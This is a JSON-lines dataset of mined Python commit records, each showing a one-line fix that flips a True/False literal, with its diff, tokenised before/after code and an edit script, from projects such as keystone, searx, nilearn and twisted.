{"project": "ampt", "commit_sha": "75288be564c6cd3be07665eb61672aec0c75d152", "parent_sha": "1653bd16e3684f0b143cd84909d1b71325b69d40", "file_path": "src/ampt/tools/widgets/content_outliner.py", "project_url": "https://github.com/griffinanimator/ampt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3,7 +3,7 @@ Signal = QtCore.Signal\n \n \n def fill_tree(item, value):\n-    item.setExpanded(True)\n+    item.setExpanded(False)\n     if type(value) is dict:\n         for key, val in sorted(value.iteritems()):\n             child = QtGui.QTreeWidgetItem()\n", "before": "item . setExpanded ( True )", "after": "item . setExpanded ( False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 27], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 22, 3, 26]]]"}
{"project": "keystone", "commit_sha": "a81f7aece5ce84ee467353b573bd00cb6284bcd2", "parent_sha": "d13c03974e5f4a093c87cbaf53ca05ca2d065d87", "file_path": "keystone/contrib/roles/controllers.py", "project_url": "https://github.com/theresoft/keystone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -241,7 +241,7 @@ class FiwareApiControllerV3(BaseControllerV3):\n         application_id = token['consumer_id']\n \n         organizations = self.roles_api.get_authorized_organizations(\n-            user, application_id, include_default_organization=True)\n+            user, application_id, include_default_organization=False)\n \n         return {\n             'organizations': organizations\n", "before": "organizations = self . roles_api . get_authorized_organizations ( user , application_id , include_default_organization = True )", "after": "organizations = self . roles_api . get_authorized_organizations ( user , application_id , include_default_organization = False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 35, 3, 68], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 64, 3, 68]]]"}
{"project": "Printrun", "commit_sha": "470ab93447bc35c2733b46c1480d6c92089ae592", "parent_sha": "b3658bfe79f5d8c8c11009b06cee47ad74c01c35", "file_path": "xybuttons.py", "project_url": "https://github.com/wolfmanjm/Printrun", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class XYButtons(BufferedCanvas):\n         self.corner = None\n         self.moveCallback = moveCallback\n         self.cornerCallback = cornerCallback\n-        self.enabled = True\n+        self.enabled = False\n \n         BufferedCanvas.__init__(self, parent, ID)\n \n", "before": "self . enabled = True", "after": "self . enabled = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 28], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 24, 3, 28]]]"}
{"project": "tobac", "commit_sha": "3be9a70adeaa3e7d523d32f0eaab3c4434b865a2", "parent_sha": "8d6d8b494d6f9332f65bffdae2b2079b8498933e", "file_path": "cloudtrack/plotting.py", "project_url": "https://github.com/mheikenfeld/tobac", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ def plot_tracks_mask_field_loop(track,field,Mask,axes=None,name=None,plot_dir='.\n \n \n def plot_tracks_mask_field(track,field,Mask,axes=None,axis_extent=None,\n-                           plot_outline=True,plot_marker=True,marker_track='x',plot_number=False,\n+                           plot_outline=True,plot_marker=True,marker_track='x',plot_number=True,\n                            vmin=None,vmax=None,n_levels=50):\n     import cartopy\n     from cartopy.mpl.gridliner import LONGITUDE_FORMATTER, LATITUDE_FORMATTER\n", "before": "def plot_tracks_mask_field ( track , field , Mask , axes = None , axis_extent = None , plot_outline = True , plot_marker = True , marker_track = 'x' , plot_number = False , vmin = None , vmax = None , n_levels = 50 ) : import cartopy from cartopy . mpl . gridliner import LONGITUDE_FORMATTER , LATITUDE_FORMATTER", "after": "def plot_tracks_mask_field ( track , field , Mask , axes = None , axis_extent = None , plot_outline = True , plot_marker = True , marker_track = 'x' , plot_number = True , vmin = None , vmax = None , n_levels = 50 ) : import cartopy from cartopy . mpl . gridliner import LONGITUDE_FORMATTER , LATITUDE_FORMATTER", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 80, 3, 97], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 92, 3, 97]]]"}
{"project": "distutils2", "commit_sha": "19d53c878ce4433a35e06959be9e7d304bafac12", "parent_sha": "93f47eeb18b81f7fe460e36c0dae8ad6053465f7", "file_path": "distutils2/metadata.py", "project_url": "https://github.com/crateio/distutils2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -480,7 +480,7 @@ class Metadata(object):\n         return value\n \n     def check(self, strict=False, restructuredtext=False):\n-        \"\"\"Check if the metadata is compliant. If strict is False then raise if\n+        \"\"\"Check if the metadata is compliant. If strict is True then raise if\n", "before": "def check ( self , strict = False , restructuredtext = False ) : \"\"\" Check if the metadata is compliant . If strict is False then raise if", "after": "def check ( self , strict = False , restructuredtext = False ) : \"\"\" Check if the metadata is compliant . If strict is True then raise if", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 25, 3, 66], [\"true:True\", \"T\"], 5], [\"Delete\", [\"false:False\", 3, 61, 3, 66]]]"}
{"project": "searx", "commit_sha": "aedf03c0f750240b19f01ed1a007043141c667dc", "parent_sha": "f03ad0a3c0d32d6f6389c7891d752da11c0e8534", "file_path": "searx/search/processors/online.py", "project_url": "https://github.com/MarcAbonce/searx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class OnlineProcessor(EngineProcessor):\n         soft_max_redirects = params.get('soft_max_redirects', max_redirects or 0)\n \n         # raise_for_status\n-        request_args['raise_for_httperror'] = params.get('raise_for_httperror', False)\n+        request_args['raise_for_httperror'] = params.get('raise_for_httperror', True)\n \n         # specific type of request (GET or POST)\n         if params['method'] == 'GET':\n", "before": "request_args [ 'raise_for_httperror' ] = params . get ( 'raise_for_httperror' , False )", "after": "request_args [ 'raise_for_httperror' ] = params . get ( 'raise_for_httperror' , True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 57, 3, 87], [\"true:True\", \"T\"], 3], [\"Delete\", [\"false:False\", 3, 81, 3, 86]]]"}
{"project": "iterative-Random-Forest", "commit_sha": "af0f2293a031f190f7ce834b1344c64292900901", "parent_sha": "62e482ec0f5bd6078be2fd7104bef36a280ff2a5", "file_path": "scikits/learn/svm/svm.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class SVM(object):\n     def __init__(self, svm_type='c_svc', kernel_type='rbf', degree=3, \\\n                  gamma=0.0, coef0=0.0, cache_size=100.0, eps=1e-3,\n                  C=1.0, nr_weight=0, nu=0.5, p=0.1, shrinking=1,\n-                 probability=0, scale=True):\n+                 probability=0, scale=False):\n         self.svm_type = svm_types.index(svm_type)\n         self.kernel_type = kernel_types.index(kernel_type)\n         self.degree = degree\n", "before": "def __init__ ( self , svm_type = 'c_svc' , kernel_type = 'rbf' , degree = 3 , gamma = 0.0 , coef0 = 0.0 , cache_size = 100.0 , eps = 1e-3 , C = 1.0 , nr_weight = 0 , nu = 0.5 , p = 0.1 , shrinking = 1 , probability = 0 , scale = True ) : self . svm_type = svm_types . index ( svm_type ) self . kernel_type = kernel_types . index ( kernel_type ) self . degree = degree", "after": "def __init__ ( self , svm_type = 'c_svc' , kernel_type = 'rbf' , degree = 3 , gamma = 0.0 , coef0 = 0.0 , cache_size = 100.0 , eps = 1e-3 , C = 1.0 , nr_weight = 0 , nu = 0.5 , p = 0.1 , shrinking = 1 , probability = 0 , scale = False ) : self . svm_type = svm_types . index ( svm_type ) self . kernel_type = kernel_types . index ( kernel_type ) self . degree = degree", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 33, 3, 43], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 39, 3, 43]]]"}
{"project": "farfetchd", "commit_sha": "2b8db15122aba7bb95c76c4302655582e69496e8", "parent_sha": "b1d0d8c1eb73d92a26d60ac08c01939a3dcaf307", "file_path": "farfetchd/server.py", "project_url": "https://github.com/isislovecruft/farfetchd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -127,7 +127,7 @@ class CaptchaFetchResource(CaptchaResource):\n     responseType = \"fetch\"\n \n     def __init__(self, hmacKey=None, publicKey=None, secretKey=None,\n-                 captchaDir=\"captchas\", useForwardedHeader=False):\n+                 captchaDir=\"captchas\", useForwardedHeader=True):\n         CaptchaResource.__init__(self, hmacKey, publicKey, secretKey,\n                                  useForwardedHeader)\n         self.captchaDir = captchaDir\n", "before": "def __init__ ( self , hmacKey = None , publicKey = None , secretKey = None , captchaDir = \"captchas\" , useForwardedHeader = False ) : CaptchaResource . __init__ ( self , hmacKey , publicKey , secretKey , useForwardedHeader ) self . captchaDir = captchaDir", "after": "def __init__ ( self , hmacKey = None , publicKey = None , secretKey = None , captchaDir = \"captchas\" , useForwardedHeader = True ) : CaptchaResource . __init__ ( self , hmacKey , publicKey , secretKey , useForwardedHeader ) self . captchaDir = captchaDir", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 41, 3, 65], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 60, 3, 65]]]"}
{"project": "iterative-Random-Forest", "commit_sha": "b6a61176610f81bcb97c25a101dc5c6278139809", "parent_sha": "3f5cf5fcca21b3a2fcd0dc566f8d2578b29d9736", "file_path": "scikits/learn/linear_model/ridge.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class RidgeLOO(LinearModel):\n \n-    def __init__(self, alphas=np.array([0.1, 1.0, 10.0]), fit_intercept=False,\n+    def __init__(self, alphas=np.array([0.1, 1.0, 10.0]), fit_intercept=True,\n                        score_func=None, loss_func=None):\n         self.alphas = alphas\n         self.fit_intercept = fit_intercept\n", "before": "def __init__ ( self , alphas = np . array ( [ 0.1 , 1.0 , 10.0 ] ) , fit_intercept = False , score_func = None , loss_func = None ) : self . alphas = alphas self . fit_intercept = fit_intercept", "after": "def __init__ ( self , alphas = np . array ( [ 0.1 , 1.0 , 10.0 ] ) , fit_intercept = True , score_func = None , loss_func = None ) : self . alphas = alphas self . fit_intercept = fit_intercept", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 1, 59, 1, 78], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 1, 73, 1, 78]]]"}
{"project": "iterative-Random-Forest", "commit_sha": "85f2900ebf5d236a770412bc2dbfe58bca614af8", "parent_sha": "c9f42b6c8f07657bc593e7b297eb63ca825619fd", "file_path": "sklearn/neighbors/approximate.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -411,7 +411,7 @@ class LSHForest(BaseEstimator, KNeighborsMixin, RadiusNeighborsMixin):\n             Number of neighbors required. If not provided, this will\n             return the number specified at the initialization.\n \n-        return_distance : boolean, optional (default = False)\n+        return_distance : boolean, optional (default = True)\n             Returns the distances of neighbors if set to True.\n \n         Returns\n", "before": "return the number specified at the initialization . return_distance : boolean , optional ( default = False )", "after": "return the number specified at the initialization . return_distance : boolean , optional ( default = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 46, 3, 61], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 56, 3, 61]]]"}
{"project": "cpymad", "commit_sha": "b63e1406d63c2618ae6497cce6da65e618e27842", "parent_sha": "1d8f6b4643e64c82d067cf97043d0f75602268f5", "file_path": "src/cern/cpymad/madx.py", "project_url": "https://github.com/hibtc/cpymad", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ class Madx(object):\n         # of ChangeDirectory:\n         return ChangeDirectory(path, self._libmadx)\n \n-    def call(self, filename, chdir=True):\n+    def call(self, filename, chdir=False):\n", "before": "def call ( self , filename , chdir = True ) : ", "after": "def call ( self , filename , chdir = False ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 30, 3, 40], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 36, 3, 40]]]"}
{"project": "cuav", "commit_sha": "1cc868c60b0ecb81b702afe8842895b9a7fa9883", "parent_sha": "2eaf637c500d0df7dd278af9d98545e53a21b935", "file_path": "cuav/modules/camera_ground.py", "project_url": "https://github.com/CanberraUAV/cuav", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -419,7 +419,7 @@ class CameraGroundModule(mp_module.MPModule):\n             if self.preview_window is None or not self.preview_window.is_alive():\n                 self.preview_window = mp_image.MPImage(title='Preview', width=410, height=308, auto_size=True)\n             if self.preview_window is not None:\n-                self.preview_window.set_image(img, bgr=False)\n+                self.preview_window.set_image(img, bgr=True)\n                     \n                 \n     def log_joe_position(self, pos, frame_time, regions, filename=None, thumb_filename=None):\n", "before": "self . preview_window . set_image ( img , bgr = False )", "after": "self . preview_window . set_image ( img , bgr = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 52, 3, 61], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 56, 3, 61]]]"}
{"project": "tgext.pluggable", "commit_sha": "1bd9178c1e54d8ac61d874d35bb7b7b0955c314d", "parent_sha": "b2ddfa0542d6201052b317f07828c384abb79287", "file_path": "tgext/pluggable/plug.py", "project_url": "https://github.com/TurboGears/tgext.pluggable", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ def plug(app_config, module_name, appid=None, **kwargs):\n         if app_helpers:\n             setattr(app_helpers, module_name, module.helpers)\n \n-            if module_options.get('global_helpers', True):\n+            if module_options.get('global_helpers', False):\n                 for name, impl in inspect.getmembers(module.helpers):\n                     if name.startswith('_'):\n                         continue\n", "before": "if module_options . get ( 'global_helpers' , True ) : for name , impl in inspect . getmembers ( module . helpers ) : if name . startswith ( '_' ) : continue", "after": "if module_options . get ( 'global_helpers' , False ) : for name , impl in inspect . getmembers ( module . helpers ) : if name . startswith ( '_' ) : continue", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 58], [\"false:False\", \"T\"], 3], [\"Delete\", [\"true:True\", 3, 53, 3, 57]]]"}
{"project": "TrackNPred", "commit_sha": "db084e65ba847ce2521a74fb2d17b0075ef68066", "parent_sha": "13cbc5d00e12fe24bdb25e14cff9be793e95ae8b", "file_path": "model/model.py", "project_url": "https://github.com/rohanchandra30/TrackNPred", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -113,7 +113,7 @@ class TnpModel:\n         args['num_lat_classes'] = 3\n         args['num_lon_classes'] = 2\n         args['use_maneuvers'] = viewArgs[\"maneuvers\"]\n-        args['ours'] = False\n+        args['ours'] = True\n         args['nll_only'] = True\n         args[\"learning_rate\"] = viewArgs[\"lr\"]\n         \n", "before": "args [ 'ours' ] = False", "after": "args [ 'ours' ] = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 29], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 24, 3, 29]]]"}
{"project": "Pointnet2.ScanNet", "commit_sha": "3890557eb75aec720fbb4fa53dd4c29617541a1b", "parent_sha": "2df2bc002faa971b046b973b29e0f97445824fc8", "file_path": "train.py", "project_url": "https://github.com/daveredrum/Pointnet2.ScanNet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ def train(args):\n         is_wholescene = False\n \n     train_dataset, train_dataloader = get_dataloader(args, train_scene_list, True, False)\n-    val_dataset, val_dataloader = get_dataloader(args, val_scene_list, True, is_wholescene)\n+    val_dataset, val_dataloader = get_dataloader(args, val_scene_list, False, is_wholescene)\n     dataloader = {\n         \"train\": train_dataloader,\n         \"val\": val_dataloader\n", "before": "val_dataset , val_dataloader = get_dataloader ( args , val_scene_list , True , is_wholescene )", "after": "val_dataset , val_dataloader = get_dataloader ( args , val_scene_list , False , is_wholescene )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 49, 3, 92], [\"false:False\", \"T\"], 5], [\"Delete\", [\"true:True\", 3, 72, 3, 76]]]"}
{"project": "oddt", "commit_sha": "e598cbc566ecd1c3965c1ccf28d9a713e90afaaa", "parent_sha": "2e3e29ef0c89ffe34c905472ee8389854b9d5a1e", "file_path": "oddt/spatial.py", "project_url": "https://github.com/BioinformaticsArchive/oddt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def dihedral(p1,p2,p3,p4):\n         out[mask] = -out[mask]\n     return out\n \n-def rmsd(ref, mol, ignore_h = False, canonize = False, normalize = False):\n+def rmsd(ref, mol, ignore_h = True, canonize = False, normalize = False):\n", "before": "def rmsd ( ref , mol , ignore_h = False , canonize = False , normalize = False ) : ", "after": "def rmsd ( ref , mol , ignore_h = True , canonize = False , normalize = False ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 20, 3, 36], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 31, 3, 36]]]"}
{"project": "wyrm", "commit_sha": "0f2ff2d056498541506067cc3630b5df0d325334", "parent_sha": "fdfe5870a492d09ee52692c230ce898719168e39", "file_path": "wyrm/processing.py", "project_url": "https://github.com/BioinformaticsArchive/wyrm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -170,7 +170,7 @@ CHANNEL_10_20 = (\n )\n \n \n-def lda_train(fv, shrink=True):\n+def lda_train(fv, shrink=False):\n", "before": "def lda_train ( fv , shrink = True ) : ", "after": "def lda_train ( fv , shrink = False ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 19, 3, 30], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 26, 3, 30]]]"}
{"project": "cmonkey2", "commit_sha": "bc1efd98ccc49ba392a20149179bbc24367216be", "parent_sha": "e2e8f6592ac11842ca6a929553a4775fdc2e04d8", "file_path": "cmonkey/datamatrix.py", "project_url": "https://github.com/BioinformaticsArchive/cmonkey2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -275,7 +275,7 @@ class DataMatrixFactory:\n         \"\"\"create a reader instance with the specified filters\"\"\"\n         self.filters = filters\n \n-    def create_from(self, delimited_file, case_sensitive=False):\n+    def create_from(self, delimited_file, case_sensitive=True):\n         \"\"\"creates and returns an initialized, filtered DataMatrix instance\"\"\"\n         lines = delimited_file.lines\n         header = delimited_file.header\n", "before": "def create_from ( self , delimited_file , case_sensitive = False ) : \"\"\"creates and returns an initialized, filtered DataMatrix instance\"\"\" lines = delimited_file . lines header = delimited_file . header", "after": "def create_from ( self , delimited_file , case_sensitive = True ) : \"\"\"creates and returns an initialized, filtered DataMatrix instance\"\"\" lines = delimited_file . lines header = delimited_file . header", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 43, 3, 63], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 58, 3, 63]]]"}
{"project": "nilearn", "commit_sha": "8e764cbdbf799aad74b2e44fa3ce5224b5af1d67", "parent_sha": "4a455ab62ef884c6e722c65bff1d48c852d72b3c", "file_path": "nilearn/plotting/img_plotting.py", "project_url": "https://github.com/hanke/nilearn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ def _plot_img_with_bg(img, bg_img=None, cut_coords=None,\n \n def plot_img(img, cut_coords=None, output_file=None, display_mode='ortho',\n             figure=None, axes=None, title=None, threshold=None,\n-            annotate=True, draw_cross=True, black_bg=False, colorbar=True, **kwargs):\n+            annotate=True, draw_cross=True, black_bg=False, colorbar=False, **kwargs):\n", "before": "def plot_img ( img , cut_coords = None , output_file = None , display_mode = 'ortho' , figure = None , axes = None , title = None , threshold = None , annotate = True , draw_cross = True , black_bg = False , colorbar = True , ** kwargs ) : ", "after": "def plot_img ( img , cut_coords = None , output_file = None , display_mode = 'ortho' , figure = None , axes = None , title = None , threshold = None , annotate = True , draw_cross = True , black_bg = False , colorbar = False , ** kwargs ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 61, 3, 74], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 70, 3, 74]]]"}
{"project": "pycaption", "commit_sha": "e8349e4b1dc82dc5fbbb382ca48ddaf2869eecdf", "parent_sha": "2e699881147e9d3e49ce31a63615bb3c1120dcae", "file_path": "pycaption/sami.py", "project_url": "https://github.com/MagikVision/pycaption", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ class SAMIReader(BaseReader):\n             # recursively call function for any children elements\n             for a in tag.contents:\n                 self._translate_tag(a)\n-            node = CaptionData.create_style(True, args)\n+            node = CaptionData.create_style(False, args)\n             self.line.append(node)\n         else:\n             for a in tag.contents:\n", "before": "node = CaptionData . create_style ( True , args )", "after": "node = CaptionData . create_style ( False , args )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 44, 3, 56], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 45, 3, 49]]]"}
{"project": "weaver", "commit_sha": "20585367a647f7e2c3e2510418475db3abb31a74", "parent_sha": "166c85b1a8b05d8a80b5bfe7497dcfc98ac5e0fe", "file_path": "weaver/database/__init__.py", "project_url": "https://github.com/crim-ca/weaver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ def get_db(container):\n \n def includeme(config):\n     settings = get_settings(config)\n-    if asbool(settings.get(\"weaver.build_docs\", True)):\n+    if asbool(settings.get(\"weaver.build_docs\", False)):\n         LOGGER.info(\"Skipping database when building docs...\")\n         return\n \n", "before": "if asbool ( settings . get ( \"weaver.build_docs\" , True ) ) : LOGGER . info ( \"Skipping database when building docs...\" ) return", "after": "if asbool ( settings . get ( \"weaver.build_docs\" , False ) ) : LOGGER . info ( \"Skipping database when building docs...\" ) return", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 54], [\"false:False\", \"T\"], 3], [\"Delete\", [\"true:True\", 3, 49, 3, 53]]]"}
{"project": "twisted", "commit_sha": "0e86b77db5f45c57e0d23dca18e668304312c276", "parent_sha": "647a0517d64e670340ebd2917b08a01138df343f", "file_path": "twisted/web2/resource.py", "project_url": "https://github.com/longaccess/twisted", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class MetaDataMixin(object):\n         \"\"\"\n         @return: True if the resource exists on the server, False otherwise.\n         \"\"\"\n-        return False\n+        return True\n \n class RenderMixin(MetaDataMixin):\n", "before": "return False", "after": "return True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 21], [\"true:True\", \"T\"], 1], [\"Delete\", [\"false:False\", 3, 16, 3, 21]]]"}
{"project": "murano", "commit_sha": "c04b9e678f565d5715ec3c5b5456e235fb93672d", "parent_sha": "b3a45217bffa2fff2a395d5d8d6d57e3f23b0e4f", "file_path": "muranoapi/db/migrate_repo/versions/001_add_initial_tables.py", "project_url": "https://github.com/telefonicaid/murano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ def upgrade(migrate_engine):\n                    Column('id', String(32), primary_key=True),\n                    Column('created', DateTime, nullable=False),\n                    Column('updated', DateTime, nullable=False),\n-                   Column('entity', String(10), nullable=False),\n+                   Column('entity', String(10), nullable=True),\n                    Column('entity_id', String(32), nullable=True),\n                    Column('environment_id', String(32), nullable=True),\n                    Column('deployment_id', String(32), nullable=False),\n", "before": "Column ( 'entity' , String ( 10 ) , nullable = False ) ,", "after": "Column ( 'entity' , String ( 10 ) , nullable = True ) ,", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 49, 3, 63], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 58, 3, 63]]]"}
{"project": "cclib", "commit_sha": "03f36b0d4e6a3c070318524baead8949c1d04237", "parent_sha": "f1aaf2788a7903f732887a1c5a0131c4759ae6eb", "file_path": "test/regression.py", "project_url": "https://github.com/chemistry-scripts/cclib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3294,7 +3294,7 @@ def make_regression_from_old_unittest(test_class):\n     return old_unit_test\r\n \r\n \r\n-def test_regressions(which=[], opt_traceback=False, regdir=__regression_dir__, loglevel=logging.ERROR):\r\n+def test_regressions(which=[], opt_traceback=True, regdir=__regression_dir__, loglevel=logging.ERROR):\r\n \r\n     # Build a list of regression files that can be found. If there is a directory\r\n     # on the third level, then treat all files within it as one job.\r\n", "before": "def test_regressions ( which = [ ] , opt_traceback = False , regdir = __regression_dir__ , loglevel = logging . ERROR ) : ", "after": "def test_regressions ( which = [ ] , opt_traceback = True , regdir = __regression_dir__ , loglevel = logging . ERROR ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 32, 3, 51], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 46, 3, 51]]]"}
{"project": "xonsh", "commit_sha": "05d8e4ffc39ab9d1ad3a0e61f62a17aee1bbffc8", "parent_sha": "c15277f8ff6de2923cc3cfbe9f324f996bb44f50", "file_path": "xonsh/ptk/key_bindings.py", "project_url": "https://github.com/nicfit/xonsh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ class ShouldConfirmCompletion(Filter):\n     def __call__(self, cli):\n-        return (builtins.__xonsh_env__.get('COMPLETION_CONFIRM', True)\n+        return (builtins.__xonsh_env__.get('COMPLETION_CONFIRM', False)\n                 and bool(cli.current_buffer.complete_state))\n \n \n", "before": "return ( builtins . __xonsh_env__ . get ( 'COMPLETION_CONFIRM' , True ) and bool ( cli . current_buffer . complete_state ) )", "after": "return ( builtins . __xonsh_env__ . get ( 'COMPLETION_CONFIRM' , False ) and bool ( cli . current_buffer . complete_state ) )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 43, 1, 71], [\"false:False\", \"T\"], 3], [\"Delete\", [\"true:True\", 1, 66, 1, 70]]]"}
{"project": "pyethereum", "commit_sha": "5e546ca8a4aaca0f789b45fbb86237b2413d0ce6", "parent_sha": "8f5eea75cd8e44b7d9cc1d98009a2ed856287030", "file_path": "ethereum/abi.py", "project_url": "https://github.com/PabloLefort/pyethereum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ class ContractTranslator():\n     def is_unknown_type(self, name):\n         return self.function_data[name][\"is_unknown_type\"]\n \n-    def listen(self, log, noprint=False):\n+    def listen(self, log, noprint=True):\n         if not len(log.topics) or log.topics[0] not in self.event_data:\n             return\n         types = self.event_data[log.topics[0]]['types']\n", "before": "def listen ( self , log , noprint = False ) : if not len ( log . topics ) or log . topics [ 0 ] not in self . event_data : return types = self . event_data [ log . topics [ 0 ] ] [ 'types' ]", "after": "def listen ( self , log , noprint = True ) : if not len ( log . topics ) or log . topics [ 0 ] not in self . event_data : return types = self . event_data [ log . topics [ 0 ] ] [ 'types' ]", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 27, 3, 40], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 35, 3, 40]]]"}
{"project": "stbgui", "commit_sha": "2701861d66fd17ed825de7bbfdea8e000fdb30b4", "parent_sha": "089c965d09e2af09a4731ff164e1b68b3daf8047", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -7,7 +7,7 @@ import os\n \n def InitUsageConfig():\n \tconfig.usage = ConfigSubsection();\n-\tconfig.usage.showdish = ConfigYesNo(default = False)\n+\tconfig.usage.showdish = ConfigYesNo(default = True)\n \tconfig.usage.multibouquet = ConfigYesNo(default = False)\n \tconfig.usage.quickzap_bouquet_change = ConfigYesNo(default = False)\n \tconfig.usage.e1like_radio_mode = ConfigYesNo(default = False)\n", "before": "config . usage . showdish = ConfigYesNo ( default = False )", "after": "config . usage . showdish = ConfigYesNo ( default = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 38, 3, 53], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 48, 3, 53]]]"}
